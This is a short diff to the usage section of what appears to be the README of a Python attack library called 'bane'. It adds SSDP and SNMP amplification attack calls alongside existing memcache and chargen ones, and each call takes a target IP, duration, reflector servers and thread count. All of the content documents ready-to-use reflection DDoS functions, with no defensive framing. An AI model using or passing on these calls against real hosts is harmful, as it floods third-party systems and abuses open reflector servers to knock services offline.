@@ -159,3 +159,7 @@ II-Usage:
 <br>bane.memcache_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
 <h4>Chargen amplification attack:</h4>
 <br>bane.chargen_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<h4>SSDP amplification attack:</h4>
+<br>bane.ssdp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<h4>SNMP amplification attack:</h4>
+<br>bane.snmp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
